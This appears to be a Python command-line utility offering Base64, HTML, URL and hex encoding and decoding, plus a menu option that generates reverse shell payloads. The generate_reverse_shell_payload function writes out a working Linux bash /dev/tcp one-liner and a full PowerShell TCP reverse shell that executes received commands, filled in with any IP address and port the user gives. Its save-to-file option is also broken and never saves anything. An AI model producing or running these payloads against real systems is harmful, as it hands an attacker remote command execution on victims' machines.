import base64
import html
import urllib.parse
import binascii

def base64_encode(data, encoding='utf-8'):
    """Encodes data using Base64."""
    encoded_bytes = base64.b64encode(data.encode(encoding))
    encoded_string = encoded_bytes.decode(encoding)
    return encoded_string

def base64_decode(data, encoding='utf-8'):
    """Decodes data using Base64."""
    decoded_bytes = base64.b64decode(data.encode(encoding))
    decoded_string = decoded_bytes.decode(encoding)
    return decoded_string

def html_encode(data):
  """Encodes data using HTML entities."""
  return html.escape(data)

def html_decode(data):
    """Decodes data with html entities."""
    return html.unescape(data)

def url_encode(data):
    """Encodes data for use in a URL, encoding spaces with '+'."""
    return urllib.parse.quote_plus(data)

def url_encode_standard(data):
    """Encodes data for use in a URL, not encoding spaces."""
    return urllib.parse.quote(data)

def url_decode(data):
    """Decodes data from a URL."""
    return urllib.parse.unquote_plus(data)

def hex_encode(data):
    """Encodes data using hexadecimal encoding."""
    encoded_bytes = binascii.hexlify(data.encode('utf-8'))
    encoded_string = encoded_bytes.decode('utf-8')
    return encoded_string

def hex_decode(data):
    """Decodes data from hexadecimal encoding."""
    decoded_bytes = binascii.unhexlify(data.encode('utf-8'))
    decoded_string = decoded_bytes.decode('utf-8')
    return decoded_string

def generate_reverse_shell_payload(ip_address, port, os_type="linux"):
  """Generates a reverse shell payload for a given OS."""
  if os_type.lower() == "linux":
    payload = f"bash -i >& /dev/tcp/{ip_address}/{port} 0>&1"
  elif os_type.lower() == "windows":
    # Example: powershell-based reverse shell
    payload = f"$client = New-Object System.Net.Sockets.TCPClient('{ip_address}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}}$client.Close()"

  else:
    return "Unsupported OS"
  return payload


def main():
    text_to_process = input("Enter the text you want to process: ")
    print("\nChoose an operation:")
    print("1. Base64 Encode")
    print("2. Base64 Decode")
    print("3. HTML Encode")
    print("4. HTML Decode")
    print("5. URL Encode (Quote_Plus - encodes spaces as +)")
    print("6. URL Encode (Quote - doesn't encode spaces)")
    print("7. URL Decode")
    print("8. Hex Encode")
    print("9. Hex Decode")
    print("10. Generate Reverse Shell Payload")
    print("11. Load from File")
    print("12. Save to File")

    choice = input("Enter your choice (1-12): ")

    if choice == '1':
        encoding_choice = input("Enter character encoding (default: utf-8): ") or 'utf-8'
        encoded_text = base64_encode(text_to_process, encoding_choice)
        print("Base64 Encoded:", encoded_text)

    elif choice == '2':
        encoding_choice = input("Enter character encoding (default: utf-8): ") or 'utf-8'
        decoded_text = base64_decode(text_to_process, encoding_choice)
        print("Base64 Decoded:", decoded_text)

    elif choice == '3':
        encoded_text = html_encode(text_to_process)
        print("HTML Encoded:", encoded_text)

    elif choice == '4':
        decoded_text = html_decode(text_to_process)
        print("HTML Decoded:", decoded_text)

    elif choice == '5':
        encoded_text = url_encode(text_to_process)
        print("URL Encoded (Quote_Plus):", encoded_text)

    elif choice == '6':
        encoded_text = url_encode_standard(text_to_process)
        print("URL Encoded (Quote):", encoded_text)

    elif choice == '7':
        decoded_text = url_decode(text_to_process)
        print("URL Decoded:", decoded_text)

    elif choice == '8':
        encoded_text = hex_encode(text_to_process)
        print("Hex Encoded:", encoded_text)

    elif choice == '9':
        decoded_text = hex_decode(text_to_process)
        print("Hex Decoded:", decoded_text)

    elif choice == '10':
        ip_address = input("Enter IP Address: ")
        port = input("Enter port: ")
        os_type = input("OS Type (Linux/Windows): ").lower()
        if os_type not in ("linux", "windows"):
            print("Invalid OS type.  Must be Linux or Windows.")
            return
        payload = generate_reverse_shell_payload(ip_address, port, os_type)
        print("Reverse Shell Payload:", payload)

    elif choice == '11':  # Load from file
        file_path = input("Enter file path: ")
        try:
            with open(file_path, 'r') as f:
                text_to_process = f.read()
            print("Loaded text from:", file_path)
        except FileNotFoundError:
            print("File not found.")
            return
        except Exception as e:
            print("Error reading file:", e)
            return

    elif choice == '12': # Save to file
        if 'encoded_text' in locals():
            text_to_save = encoded_text
        elif 'decoded_text' in locals():
            text_to_save = decoded_text
        else:
            print("No encoded or decoded text available to save.")
            return

        file_path = input("Enter output file path: ")
        try:
            with open(file_path, 'w') as f:
                f.write(text_to_save)
            print("Output saved to:", file_path)
        except Exception as e:
            print("Error saving to file:", e)

    else:
        print("Invalid choice. Please select a number between 1 and 12.")

if __name__ == "__main__":
    main()

